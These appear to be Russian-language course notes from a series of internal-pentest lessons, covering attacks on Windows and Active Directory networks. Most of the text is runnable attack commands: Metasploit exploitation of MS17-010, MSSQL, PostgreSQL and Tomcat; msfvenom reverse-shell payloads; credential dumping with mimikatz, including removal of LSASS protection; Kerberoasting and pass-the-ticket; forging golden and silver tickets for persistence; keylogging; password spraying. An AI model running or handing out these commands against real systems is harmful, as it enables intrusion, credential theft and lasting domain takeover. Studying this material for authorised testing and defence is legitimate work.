Занятие 1

Внутренний пентест - моделируем нарушителя внутри сети

Черный ящик - гость
Серый ящик - сотрудник

PSI DSS - требования к пентесту, задача получение "Данных платежных карт"



Карта атаки
Мы --> Окружение (чаще всего active directory) --> Повышение --> Цель

План
1. Wireshark
2. Сканирование
3. "Пробив" (узнаем что можно)
4. Сбор loot (повышение)
5. Достижение цели



Воткнувшись в сеть и запустив wireshark мы ловим широковещательный трафик по следующим протоколам:

STP (защита от петель в сети)
Если в destination - Spaning-Tree-For-Bridges, то в сети стоит самая старая версия STP. Ее можно обмануть и использовать в своих целях
STP DOS:
	https://bugtraq.ru/library/books/stp/chapter06/
	http://cybervlad.net/stp/index.html

sudo yersinia -G (или -I в консольном режиме)

Защита от STP (есть в 90% случаев)
	Включение BPDUGuard и BPDUFilter
	Отключение STP на портах access (для остановки получения BDPU от пользователей)
	Port Security



ARP (50%)
ARP spoofing
	mitmf (фреймворк уже не поддерживаеся, но пока жив арп, н будет актуален)
	ettercap -T 10.10.10.10 -X --httpd --proxy-https --proxy
	arpspoof -i eth0 -t 10.10.10.10
	Intercepter-NG


	
DTP (Dynamic Trunking Protocol) (5%)
	Встречается очень редко, но можно перепрыгвать по виланам
	Scapy
	dtp.spoof.py



VTP (Обмен нформации о существовающих VLAN) (5%)
	


Rogue DHCP (90%)
(Full Slaak Attack) Очень мощная атака
В ненастроенной IPv6 сети можно стать роутером
Этот стандарт дефолтно включен на всех устройствах, более того, в WIndows IPv6 приоритетнее остальных протоколов
Но это может так-же работать как дос
	mitm6 -i eth0  	(упрощенная версия, которая не кладе сеть)



HSRP (8%)
	сморим, не передается ли autheticatio data в чистом виде
	yersinia
	scapy



RIPv2 (2%)
	если видим RIP - сразу пишем об эом как об уязвимостии



OSPF (1%)
	нет инструментов для атак



EIGRP
	Как и большнство атак на маршрутизацию, не используется, т.к. вызывает дос
	eigrp tools
	t50	



ICMP 
	ICMP  Redirect



NBT-NS/LLMNR  poisoning 
	Порядок поиска хоста по DNS
	file "hosts"
	Cash DNS
	Request DNS
	NBT-DNS



WPAD (98%)
По дефолту включен в винде, позволяет подсунуь нашг прокси и гнать весь трафик через него
	Responder
	Mitm6
	Inveigh
	msf (auxiliary/spoof/ndns/nbns_response) (auxiliary/spoof/llmnr/llmnr_response)



CDP (Cisco Discovery Protocol)
Раскрывае много информации о девайсе, реальный ip, VLAN, в котором мы находимся





Занятие 2

msf

Auxiliary
Exploits
Payloads
Post
Encoders (в теории скрывают вредоносное по от антиврусов. На практике больше используются на CTF и OSCP. Например для обхода запрещенных символов)



Auxiliary
Сбор информации



Exploits
use exploit/multi/handler

Используяются в сочетании с payload



Payloads
Bind vs Reverse
	Meterpreter
	Shell
	Command exec



Post
Постэксплуатация
Сбор  перечисление информации о системе
Сбор и перечисление иинформации о домене
Pivoting
Сканирование



Все модули сосотоят из:
Name
Description
Author
Disclosure date
Platform/Arch
License
Target (если эксплоит не работает, возможно таргет выбран не верно)



Настройка среды msf
$ sudo postgresql start (enable)
$ sudo msfdb init
$ msfconsole
msf6> db_status		Проверить статус базы данных

msf6> db_connect -y /usr/share/metasploit-framework/config/database.yml



Search 
msf6> search name:mysql
msf6> search platform:aix
msf6> search type:post
msf6> search cve:2011 author:jduck platform:linux

Grep
msf6> grep http search oracle
msf6> grep ms17 search windows
Сначала что грепаем, потом откуда грепаем 



Workspace
msf6> workspace -a <name>	Создаем рабочее пространство
msf6> workspace <name>		Перейти в рабочее пространство



Options
msf6> show options
msf6> show advansed
msf6> show targets
msf6> set <option>
msf6> unset <option>		
msf6> setg <option>		Глобальное значениие параметра
msf6> unsetg <option>		Снять глобальное значение параметра



Sessions
msf6> sessions -l		Список активных сессий
msf6> sessions -i <number>	Подключииться к сессии	
msf6> sessions -c 		Выполнение системной команды
msf6> sessions -C		Выполнениие команды метерпретера
msf6> sessions -K		Убить все сессии

Jobs
msf6> jobs -l			Список запущенных хендлеров и серверов
msf6> jobs -K			Убить все задачи



Meterpreter
Migrate (мграциия под другой процесс, что бы было сложнее задетектить процесс)
Download/Upload
Normal Linux comands
Loading of other modules (Powershell, Python (если на хосте нет питона), Kiwi...)



Masscan (для сканирования очень больших подсетей)
$ masscan 192.168.0.0/16 -p 1-65535 --rate=9999999 -oX scan_result

Nmap
$ nmap -Pn (десктопная внда не отвечает при включенном пинг скане) -n -sV (чаще всего не нужно пр массовом скане) \
--min-rate=400 --min-parallelism=512 (оптимальный параметр подобраный опытным путем) -p 21, 22, 445, 623, 1433, 5432, \
5555, 8080, 8081, 8180, 8443, 4786, 1099, 27017 --open -oA result -v 192.168.0.0/16

21 - ftp (если можно подключиться анонмно, это хорошо)
22 - =)
445 - smb
623 - ibmi
1433 - mssql (слабый пароль на учетной записи SA)
3389 - rdp (свежая bluekeep)
5432 - postgresql (слабая конфигурация пароля)
5555 - HP dataprotector (часто он без пароля)
8081 - tomcat для деплоя java прложений (учетка tomcat:tomcat)
4786 - cisco smart install (по умолчанию включен, можно стащить конфиг циски, в котором может лежать пароль в чстом или кодированном виде)
1099 - 
27017 - mongodb (не требует авторизации по дефолту)



Типовые вектора "пробива"
MS17-010 
MSSQL
PostgreSQL
Tomcat





Занятие 3

##### MS17-010 #####

smb_ms17_010 (60%)
	ms17_010_eternalblue (иногда может уронить машину. Только x64)
	ms17_010_psexec (если pipe доступен, то лучше использовать во всех случаях)
	ms17_010_eternalblue_win8 (для win8)
	*Если машна на Windows 5.1, то лучше использовать windows/smb/ms08_067_netapi

msf6> cd <folder with scan> 				Переходим в папку со сканом
msf6> db_import scan					Подгружаем файл сканирования в базу данных msf
msf6> services						Вывод информации из базы данных
msf6> services -p 445					Выводм только с портами 445

msf6> use auxiliary/scanner/smb/smb_version		Модуль собирает некоторую инфомрацию о SMB
msf6> options						
msf6> services -p 445 -R				Устанавливаем дапазон машиин как RHOST
msf6> set threads 50					
msf6> set verbose false					Отключаем лишний вывод информации
msf6> run						Запускаем

msf6> services -p 445					Теперь имеем всю информацию

Сканируем на ms17_010
msf6> use auxiliary/scanner/smb/smb_ms17_010		Сканируем на ms17_010
msf6> set threads 100
msf6> set verbose false
msf6> set check_pipe true				Заодно ищем открытые пайпы		
msf6> run

msf6> vulns 						Показывает все найденные уязвимости

Эксплуатируем psexec
msf6> use windows/smb/ms17_010_psexec			Если нашли пайп, то используем psexec
msf6> set rhost <ip>
msf6> set payload windows/x64/meterpreter/reverse_tcp	Для ms17_010 нужно выбрать 64-битную версию
msf6> set lhsot <tun0>					Вместо адреса можно указать интерфейс
msf6> run

Доп варианты нагрузок, если системы защиты блокируют
windows/x64/meterpreter/reverse_https
windows/x64/meterpreter/reverse_tcp_rc4
windows/x64/shell_reverse_tcp
windows/x64/shell/reverse_tcp




##### MSSQL #####

mssql (20%)
	mssql_login (брут учетных записей, в т.ч. дефолтной 'sa')
	mssql_exec (исполняет одну единственную команду)
	mssql_payload (указываем адрес, учетку и пароль к mssql и получаем шелл)

Подбираем учетные данные
msf6> services -p 1433					Сортируем по порту mssql
msf6> use auxiliary/scanner/mssql/mssql_login		Брут учетки
msf6> set rhosts <ip>
msf6> set USERNAME <sa>					Не обязательно, по дефолту будет 'sa'
msf6> set pass_file </usr/share/wordlists/rockyou.txt>  Выбираем словарь для брута
msf6> set threads 100
msf6> set stop_on_success true				Остановка после успешно найденного пароля
msf6> run

msf6> creds						Выводим все сбрученные креды

Эксплуатируем
msf6> use exploit/windows/mssql/mssql_payload
msf6> set password <pass>				Ставим найденый пароль
msf6> set lhost <tun0>
msf6> set rhost <ip>
msf6> run




##### PostgreSQL #####

Часто встречается стандартная учетка postgres:postgres
Может висеть на линуксе или на винде

postgres (15%)
	postgres_login
	postgres_payload
	postgres_copy_from_program_cmd_exec (в свежих версиях)

Брутаем стандартные учетки
msf6> use auxiliary/scanner/postgres/postgres_login
msf6> services -p 5432 -R
msf6> run

Эксплуатация под windows
msf6> use exploit/windows/postgres/postgres_payload
msf6> set rhost <ip>
msf6> set lhost <tun0>
msf6> run	
Если ошибка - смотрим на строку с ip аддресом (мб у нас другая опреационка?)

Эксплуатация Linux
msf6> use exploit/linux/postgres/postgres_payload	Если все-таким во второй строчке написано про linux =)
msf6> set rhosts <ip>
msf6> set lhost tun0

*Если система 64 битная
msf6> show targets					Список возможных таргетов
msf6> set target Linux\ x86_64				Если во второй строчке сказано, что у нас 64 система
msf6> set payload linux/x64/meterpreter/reverse_tcp
msf6> run




##### Tomcat #####

tomcat (10%)
	tomcat_mgr_login (брутаем учетные данные tomcat)

Брутаем стандартные учетоки
msf6> use auxiliary/scanner/http/tomcat_mgr_login
msf6> set rhost <ip>
msf6> run

Переходим на сайт 
http://<ip>:8080/manager/html

Генерируем шелл, завернутый в war файл
$ msfvenom -p java/meterpreter/reverse_tcp LHOST=<наш ip> LPORT=4444 -f war -o tomcatshell.war

Поднимаем хендлер
msf6> use exploit/multi/handler
msf6> set lhost tun0
msf6> set payload java/meterpreter/reverse_tcp		Важно выбрать то-же пейлоад, что указали в msfvenom
msf6> run

На сайте в "war file to deploy" прикрепляем наш war файл
Обновляем страницу
Жмем по загруженному файлу в Applications




Лайфхаки

В show dvanced можно сразу после получения сессии выполнить скрипт (autoscript)

Если на машине стоит антивирус, то mssql_exec 

set EXECUSTOM 			Позволяет загрузить кастомный сервисный exe файл

$ killall <telegram>		Если девушка пишет по время занятия

$ zcat <archive>		cat файл из архива, без предварительной распаковки

meterpreter> help		ооочень много классного!
meterpreter> getid		кто текущий пользователь
meterpreter> webcam_list 	список камер
meterpreter> screenshot		сделать скрин
meterpreter> keysacn_start	запускаем кейлоггер (не идеально, но работает)

$ python -c "import pty;pty.spawn('/bin/bash')"		Получаем красивую оболочку на лиинуксовый шелл

msf6> sessions -C <ps> all	Выполнить команду сразу на всех background сессиях



Логирование действий
msf6> spool </home/hackers_log>		Выводим лог в файл
msf6> set TimestampOutput true		Включаем временную метку для логирования



Горизонтальное перемещение
"Марк Русинович Windows Internals" 	Очень полезная книга о работе windows



Выполнение кода на узле с учетной записью
PsExec  (445)  исполнение кода 
Wmiexec (135)  исполнение кода через удаленный реестр или планировщик задач
Winrm  (5985)  удаленная сессия через powershell
RDP    (3389)  сразу получаем неплохие привелегии
SSH	 (22)  =)

auxiliary/scanner/smb/smb_login 	Сканируем, подходит ли учетная запись



Этапы выполнения PsExec (445)
1) С учеткой локального админа подключаемся к smb шаре и записываем туда сервисный бинарник
2) Через sc.exe создаем сервис из нашего бинарника
3) Запускаем сервис
<здесь мы имеем машину во все порты>
4) Останавливаем сервис 
5) Удаляем сервис
6) Удаляем бинарник

Эксплуатация легитимными средствами (вообще не палится)
https://docs.microsoft.com/en-us/sysinternals/downloads/psexec	Инструмент
C:\> psexec \\<192.168.122.66> -u <Administrator> -p <Qq123> -c cmd.exe



Impacket
https://github.com/SecureAuthCorp/impacket
cd impacket/examples

RCE по протоклам DCE RPC
$ pyhton atexec.py ignite/Administrator:Qq123@192.168.1.105 systeminfo
                   ^домен ^учетка       ^pass ^адрес

(445) PsExec
$ python psexec.py ignite/Administrator:Qq123@192.168.1.105

(135) Smbexec (с большей вероятностью не будет забанен антивирусом)
$ sudo python smbexec.py ignite/Administrator:Qq123@192.168.1.105 -mode <SHARE/SERVER> 		SERVER почти не палится, но требует рут

(135) Wmiexec (оставляет меньше следов чем smbexec, выполняет через WMI)
$ python wmiexec.py ignite/Administrator:Qq123@192.168.1.195 dir



(5985) WinRM (легитимный, но включен не везде. Сразу получаем powershell)
$ gem install evil-winrm
$ evil-winrm -i 192.168.1.105 -u Administrator -p 'Qq123'




NTLM Hash
Хранится в WINDOWS/system32/config/sam
Для расшифровки нужен файл WINDOWS/system32/config/system
Administrator:500:01fc5a353edafff4cb37са4ee:5412abx756e64d84cb735a46cbac:::
^login        ^RID^LM hash    (4ee = empty) ^NT hash    (9c0 = disabled)



Hash Dump
С правами локального админа дампим хеши
meterpreter> hashdump

Mimikatz & Kiwi
meterpreter> load kiwi		Загружаем модуль Kiwi
meterpreter> help		Появляется много возможны паролей для извлечения
meterpreter> creds_all		Вытаскиваем все пароли



Pass the Hash
msf6> use auxiliary/scanner/smb/smb_login	Проверяем, подходит ли наш хеш
msf6> set SMBpass <hash>
msf6> use exploit/windows/smb/psexec
msf6> set SMBpass <hash>			Используем хеш вместо пароля



Impersonate token 
meterpreter> getsystem		Получить права системы за один клик, если есть такая возможность

Если антивирус не дает повысить привилегии другим образом (реально работает!)
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"




После получения доступа с правами системы можем:
procdump 
mimikatz
kiwi



Group Policy
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\		Хранилище груповых политик
$ use post/windows/gather/credentials/gpp	Вытащить груповые политики после эксплуатации 



Bash
Ctrl + R	Найти ии выполнить команду из истории





Занятие 4

C:\>ipconfig > ip.txt			Лучше выводить результат выполнения команд в файл



crackmapexec
https://github.com/byt3bl33d3r/CrackMapExec
$ crackmapexec smb <ip>			Вывести сведения о машине. Система, версия, разрядность...



meterpreter> SET Processor		Вывести сведения об врхитектуре



msfvenom
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meter.exe
msf6> use exploit/multi/handler
msf6> set lhost tun0
msf6> set lport 4444
msf6> set payload windows/meterpreter/reverse_tcp
msf6> run
Отдаем файл

В нем существует много модулей
$ msfvenom --list <format>
$ msfvenom --help			Очень рекомендуется ознакомться

Transform format - то, в каком виде получаем файл
Executable format - то, как файл будет запущен



Chain 1

Начинаем с поиска ms17_010
mfs6> use auxiliary/scanner/smb/ms17_010
192.168.1.109 (Windows 5.1) is likely vulnerale
msf6> use exploit/windows/smb/ms08_067_netapi			Так как мы работаем с XP
meterpreter> hashdump						Сохраняем к себе
meterpreter> load kiwi
meterpreter> creds_all						Тоже копируем

Или если модуль не орабатывает
meterpreter> upload /home/mimikatz.exe				Загружаем скачаный mimikatz
meterpreter> shell
C:\> mimikatz.exe
# PRIVILEGE::debug
# sekurlsa::logonpasswords


Получили
Administator:1004:f67ce55ac831223dc187b8085fe1d9df:161cff084477fe596a5db81874498a24:::
Administator      BUHGALTE-C8940A  1qaz@WSX
BUHGALTE-C8940A$  MSHOME           (null)

Пытаемся использовать на других машинах
msf6> use auxiliary/scaner/smb/smb_login 
msf6> services -p 445 -R
msf6> set smbuser <Administrator>
msf6> set smbpass <f67ce55ac831223dc187b8085fe1d9df:161cff084477fe596a5db81874498a24>
Curret credentials, but unable to login 			Ученая запись оключена
msf6> set smbpass <1qaz@WSX>					Проверяем и пароли

Подключаемся
msf6> use exploit/windows/smb/psexec
msf6> set smbuser <Administrator>
msf6> set smbpass <1qaz@WSX>
$ crackmapexec smb <ip>						Проверяем разряднось
msf6> set payload windows/<x64>/meterpreter/reverse_tcp

Делаем hashdump при ограничении доступа к памяти
meterpreter> run post/windows/gather/smart_hashdump
Если он падает с ошибкой, то возможно некоторые учетки он не успел выгрузить
проверяем через shell; net user

Если kiwi: loaded 32-bit vesrion on 64-bit architecture
meterpreter> ps							Выводим список процессов и ищем PID 64-биного
meterpreter> migrate <492>					Теперь мы имеем 64-битный meterpreter

meterpreter> sysinfo						Информация о машине

Если машина без портов, скорее всего они нестандартные
nmap <ip> -p- --open -sV

WinRM
$ crackmapexec winrm <ip>					Проверяем, действительно ли порт живой
$ crackmapexec winrm <ip> -u administrator -p <pass>		Проверяем креды
$ crackmapexec winrm <ip> -u administrator -p <pass> -x <dir>	Выполнить команду "dir"

Загрузим шелл через WinRM
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meter.exe
$ sudo smbserver.py <name> .
$ crackmapexec winrm <ip> -u administrator -p <pass> -x "<\\<name>\meter.exe>"

Или без поднятия сервера:
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f psh-cmd		Копируем вывод команды
msf6> use exploit/multi/handler
$ crackmapexec winrm <ip> -u administrator -p <pass> -x "rrfGV..дохрена всего..56VBy=" Вставляем то, что скопировали ('=' важно)



Возможно придется перебиратьь target
msf6> set smbdomain <domain.local>
не забываем про incognito

239
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4816afb5a756771974bd33c742f4914:::
атрибуты, рдп, 




Занятие 5

Kerberos 
Протокол для аутентификации пользователей при входе в систему
Часто встречается в Windows AD

AS - authentification server 
TGS - ticket-granting server

В Kerberos синхронизация времени крайне важна

Port 88 (kerberos) - признак контроллера домена



Работа Kerberos

1.1) Пользователь включает компьютер и вводит свою доменную учетку
AS-REQ 1.2) Запрос с паролем идет на Authentication Server проверяется с кредами из БД
AS-REP 2.1) AS отправляет session key и TGT билет на машину пользователя (билет жвет 8 часов, это мультипаспорт)
2.2) TGT записывается в память LSASS и хранится там 8 часов (или до первой перезагрузки)
Теперь пользователь может работать с другими сервисами

Пользователь хочет получить разрешение сходить на сервер А
TGS-REQ 3.1) Он отправляет свой TGT билет, session key и запрос к серверу A на Ticket Granting Server
3.2) TGS проверяет TGT билет, sesion key и факт сущестования сервера A
TGS-REP 4) TGS отправляет TGS билет пользователю и session key

Пользователь идет на сервер А
Service-REQ 5) Пользователь отправляет TGS билет на проверку серверу А и разрешает доступ в зависимоти от прав пользователя, записанных в билете
6) Пользователь получает (или не получает) доступ к серверу А


После ввода пароля в память LSASS кладутся:
хеши des_cbc_md5 aes128_hmac aes56_hmac, а так-же NTLM хеш
Обычно используется aes256_hmac, но AS примит любой из них (это детектится)

TGT билет
Client Info
User Restrictions
Ticket Lifetime
Ticket Flags
Authorization Data (С Домен Контроллера) шифруется на ключе пользователя krbtgt



Атаки

Kerberos Brute
узнав корпоративный шаблон учетных записей (I.Ivanov, Ivanov.I.S...)
можно создать словарь по шаблону и после этого побрутить
msf6> use auxiliary/gather/kreberos_enumusers
msf6> set rhosts <>
msf6> set USER_FILE <user.txt>
msf6> set DOMAIN <ignite.local>
msf6> exploit
Узнав существующие учетки бруатем их пароли по словарям



AS Rep Roasting/impacket
Если отключена Kerberos preauthentication у пользователя, можно получить его tgs, который можно брутить оффлайн
$ python impacket/examples/GetNPUsers.py CONTOSO.COM/Administrator:'P@ssw0rd' -request
В результатен получаем имя пользователя, у которого отключена preauth и его билет

Реальный пример
$ GetNPUsers.py <domain.local>/<WIN7\$> -hashes <hash> -request -dc-ip <domain controller id> 



Kerberoasting/impacket (90%)
$ impacket/examples/GetUserSPNs.py -request -dc -ip 10.10.10.100 active.htb/svs tgs

Реальный пример
$ GetUserSPNs.py <domain.local>/<WIN7\$> -hashes <hash> -request -dc-ip <192.168.1.80>
		  домен          машина, экранируем $                    ip домен-контроллера




Брутаем полученные билеты
$ hashcat -m 18200 <ASRepfile> -o <outfile> /usr/share/wordlists/rockyou.txt --force	для AS rep Roasting
$ hashcat -m 13100 <Kerbfile> -o <outfile> /usr/share/wordlists/rockyou.txt --force	для Kerberoasting

$ john --format=krb5asrep --wordlist=<rockyou.txt> <Kerbfile>				на практике работает стабильнее



$ carckmapexec smb 192.168.1.0/24		Сканируем адреса на smb порт





Занятие 6

Responder (очень важный инструмент, атака на LLMNR)
https://github.com/SpiderLabs/Responder
$ responder -I eth0 -w -r -f -F -v -v -vv

$ responder -I eth0 -w -r -f -F -v -v -vv -b	Включили basic authentication (фишинговое окно при посещении доменных ресурсов)
Теперь ждем, пока пользователь пойдет на несуществующий доменный ресурс 

/etc/Responder/Responder.conf
	Challenge = random 			Можно поставить свой челендж, что бы успорить брутфорс


Атака не деструктивная, но может собрать много NTLM хешей с домена



Брут полученных хешей
$ hashcat -m 5600 <file with hash> -o hash.out /usr/share/wordlists/rockyou.txt
$ cat hash.out



Mimikatz

https://github.com/gentilkiwi/mimikatz
Вытаскиваем хеши и пароли из LSASS
Перед использованием нужно отключить антивирус

Вытащить все креды
mimikatz # coffee				Проверить, что инструмент работает
mimikatz # privilege::debug			Работает только от привелигерованного пользователя
mimikatz # standard::log log.txt		Записываем лог файл
mimikatz # sekurlsa::logonPasswords full	Вытаскиваем данные из памяти процесса

Для XP, 2000 используем Mimilove



Поднимаем хендлер
msf6> use exploit/multi/handler
msf6> set LRORT 7777
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> run

Готовим пейлоад
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=7777 -f exe -o meter.exe	

Поднимаем smb шару в папке с пейлоадом
$ sudo python3 impacket/examples/smbserver.py kek .	



meterpreter> getuid					Узнать пользователя, под которым мы работаем
meterpreter> getsystem					Имперсонируем токен системы
meterpreter> run post/windows/gather/smart_hashdump	Если ни kiwi ни hashdump не отработали



Способ пробиться к учеткам при защищенной памяти LSASS
(Ошибка ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005))

meterpreter> upload mimikatz.exe
meterpreter> upload mimidrv.sys
meterpreter> shell
C:\>mimikatz.exe
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonPasswords full



Мануал по mimikatz
https://github.com/insi2304/Mimikatz-cheatsheet



Анализ памяти на своей машине
meterpreter> upload procdump64.exe
meterpreter> shell
c:\> procdump64.exe -ma lsass.exe dump -accepteula
meterpreter> download dump.dmp

На своей винде
mimikatz # sekurlsa::Minidump dump.dmp
mimikatz # sekurlsa::logonPasswords full

На своем линуксе
$ pypykatz lsa -t 0 minidump dump.dmp



Подсказка к последнему шагу цепочки из дз
meterpreter> impersonate_token "INFOSEC\admin"
C:\> type \\onfosec.local\C$\flag.txt





Зантятие 7

Pass the Ticket

Список kerberos билетов
meterpreter> kerberos_ticket_list		

В памяти LSASS хранятся не только парол, но  билеты

Структура билета
[0;1d0bb]-2-0-40e10000-<username>@<service>-<domain.local>.kirbi


Pass the Ticket (Windows)

На жертве
C:\> mimikatz.exe
# privilege::debug					
# token::elevate					Повышаем првлег, что бы увидеть остальные билеты, существующие в системе
# sekurlsa::tickets/export				Экспортруем билеты
# exit
C:\> dir | findet "Administrator" | findstr "krbtgt"	Сортруем блеты с юзером - Administrator и сервисом krbtgt
[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi

На своей винде
C:\> mimikatz.exe
# privilege::debug
# kerberos::ppt <[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB>.kirbi
File: '[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi': OK
# exit

Что бы не было ошибок соединения, нужно прописать DNS контроллера домена в настройках адаптера



Pass the Ticket (Linux)
meterpreter> kiwi_cmd "\"sekurlsa::ticket /export\""				Старый формат команды
meterpreter> kiwi_cmd "privilege::debug"
meterpreter> kiwi_cmd "sekurlas::ticket/export"					Новый формат команды

Если возникают проблемы, загружаем mimikatz
mimikatz # privilege::debug 
mimikatz # sekurlsa::ticket/export						Билеты появятся в теущей директории
mimikatz # exit
meterpreter> download *								В названии файлов много спецсимволов

https://github.com/Zer1t0/ticket_converter
В первую очередь берем krbtgt билеты Administrator
$ python ticket_converter.py <ticket>.kirbi <ticket>.ccache			Конвертируем блет в ccache
Converting kirbi => ccache
$ export KRB5CCNAME=/home/user/velociraptor.ccache				Экспортируем билет в переменную
$ psexec.py -k -no-pass <Administrator>@<WIN7>.<DOMAIN.local> dc-ip <192.168.1.80>						

Ошибки
[Errno -2] Name or service not known
Добавить адрес контроллера в /etc/hosts
	<192.168.1.80>	<DOMAIN.local>

KRB_AP_ERR_TKT_EXPIRED(Ticket expired)
Нужно синхронизировать время с домен-контроллером
	$ apt install rdate
	sudo rdate -n <192.168.1.80>



Overpass the Hash (Windows)
C:\> mimikatz.exe	
# privilege::debug
# sekurlsa::ekeys								Вытаскиваем ключи для машинной записи
Для запроса билета по DES требуется только NTLM хэш 				(des_cbc_md5)
# sekurlsa::logonpasswords							Вытаскваем NTLM хеши пользователя
# sekurlsa::pth /user:<user> /domain:<jessybrings.com> /ntlm:<ntlm hash>	Используем NTLM хеш 
# sekurlsa::pth /user:<user> /domain:<jessybrings.com> /aes:<aes key>		Если хотм пойти по aes256_hmac
Билет добавится в память процесса lsass

Запуск RDP по керебросу
mimikatz # sekurlsa::pth /user:invader /domain:LOCALHOST /ntlm:NTLM /run:"mstsc /v:10.0.0.2"



Overpass the Hash (Linux)
$ cd impacket/examples
$ python getTGT.py <domain.local>/<Administrator> -hashes [lm_hash]:<ntlm_hash>		Идем по NTLM
$ python getTGT.py <domain.local>/<Administrator> -aesKey <aes_hmac>			Или идем по AES (более незаметно)
$ export KRB5CCNAME=<TGT_ccache_file>

Теперь можем выполнить команду разными способами
$ python psexec.py -k -no-pass <Administrator>@<WIN7>.<domain.local> -target-ip <192.168.1.81>
$ python smbexec.py -k -no-pass <domain_name>/<user_name>@<remote_hostname> 
$ python wmiexec.py -k -no-pass <domain_name>/<user_name>@<remote_hostname> 



dcsync (hashdump на ДоменКонтроллере)

На Windows
mimikatz # lsadump::dcsync /domain:<rd.security.org> /user:<Administrator>
Нужно вытаскивать данные для каждого пользователя по отдельности

На Linux
$ cd impacket/examples
$ python secretsdump.py -hashes :<hash> Administrator@192.168.0.6 -ntds NTDS -outputfile DUMP
Заодно вытягиваем историю паролей

$ pythin secretsdump.py -hashes :<hash> Administrator@192.168.1.80 -just-dc-user krbtgt		
Вытаскваем только креды krbtgt. Если получилось, это полный захват домена

Если есть возможность использовать AES-256, всегда лучше использовать его а не DES



Golden Ticket
Требует получения прав доменного Админа и получения доступа к krbtgt

Узнаем sid
$ cd impacket/examples
$ python lookupsid.py <DOMAIN.local>/Administrator@192.168.1.80 -hashes :<hash>	Получаем sid
S-1-5-21-450836121-1649635954-203960036

Генерируем Golden ticket на Windows
C:> mimikatz
# kerberos::golden /krbtgt:<hash> /admin:administrator /domain:demo.local /sid:<S-1-5-21-4508...> /ticket:administrator.ticket.bin

Генерируем Golden ticket на Linux 
$ python ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain.local> -dc-ip <192.168.1.80> <pentest>			По NTLM (:вторая половина хеша:::)
$ python ticketer.py -aesKey <aes256_hmac> -domain-sid <sid> -domain <domain.local> -dc-ip 192.168.1.80	<pentest>		По AES
$ export KRB5CCNAME=<ip>.ccache
$ psexec.py -k -no-pass <pentest>@<WIN10>.<domain> -target-ip <192.168.1.81> 

Можно создать несуществующего пользователя, что собьет с толку админов.
Можно создать вечный билет, который будет работать хоть через 10 лет. 
Пофиксить это можно только сменой krbtgt пароля два раза, однако в таком случае будет окно в 8 часов, что бы забрать новый пароль и сделать новый Golden Ticket
В таком случае выкурить злоумышленника будет невозможно. Более того, процедура смены пароля достаточно опасная 



Silver Ticket
Имея рабочую учетку, без прав локального админа мы можем подделать билет и указать там более высокие права
Максимум на месяц

$ cd impacket/examples
$ python ticketer.py -nthash <hash> -domain-sid <sid> -domain <DOMAIN.local> -spn <service_spn> <pentest>
CIFS/<username>/domain.local	вставляем так, если что impacket подправит сам
$ python ticketer.py -aesKey <aes_key> -domain-sid <sid> -domain <DOMAIN.local> -spn <CIFS/WIN7.domain.local> <pentest>
$ export KRB5CCNAME=<pentest.ccache>

Теперь можем выполнить команду разными способами
$ python psexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>
$ python smbexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>
$ python wmiexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>



Занятие 8

Материалы от Павла по повышению привилегий на винде
powerup - скрипт дял повышения привелегий и ошибок конфигурации
https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ 
https://github.com/AlessandroZ/BeRoot.git
https://github.com/bitsadmin/wesng - python wes.py SYSINFO-FILE --exploits-only --impact "Elevation of Privilege"
https://github.com/hlldz/dazzleUP - Auto check CVE and missconfigs
https://github.com/SecWiki/windows-kernel-exploits - бинари
https://github.com/WindowsExploits/Exploits?files=1 - бинарники под cve
https://github.com/nomi-sec/PoC-in-GitHub - PoC по CVE
https://xakep.ru/2017/06/30/windows-privilege-bypass/
https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit#
https://github.com/rasta-mouse/Sherlock
https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194
https://pentestlab.blog/tag/local-exploits/ 



Атаки на домен(95%)

msf6> use auxiliary/scanner/smb/pipe_auditor				Чекаем все пайпы


PIPE Samr
Вывести список доменных пользователей 
$ sudo rpcclient -N 192.168.1.65 -U "" 
rpcclient $> enumdomusers



Enum Домена
https://github.com/m8r0wn/nullinux
$ python3 nullinux <ip>

или 
$ enum4linux <ip>
Если 
[+] Password Info for Domain:
	..
	[+] Account Lockout Threshhold: <None>/<5>				Смотрим, стоит ли ограничение на число неудачных попыток входа
	[+] Reset Account Lockout Counter: <30>/<Never>				Время до сброса числа неудачных входов	(Never - очень опасно)				



Password spraying
Идем с одним паролем сразу на все учетки

Vfhn2021		На раскладке Март2021
Vfhn2021!		Такая же логика
Atdhfkm2021
Atdhfkm2021!
P@ssw0rd
Aa12345678		Тоже очень частый пароль
1qaz@WSX		Частый геометрический пароль  
!QAZ2wsx



Брут
$ crackmapexec smb <ip> -u <словарь с логинами> -p <P@ssw0rd@1> <!QAZ2wsx> --continue-on-success
$ hydra -L <user.txt> -p Password@1 <id> smb						Но, в отличии от прошлого варианта, не отображает, что учетки начали лочиться
msf6> smb/smb_login
$ patator smb_login host=<ip> user=FILE0 0=<file> password=Password@1

Пароль доменного администратора никогда не лочится => брутаем сколько хотим



https://github.com/samratashok/ADModule



PowerView
https://github.com/PowerShellMafia/PowerSploit



CRTP - индусский курс по powershell. Есть много сливов в телеге
на pentester academy



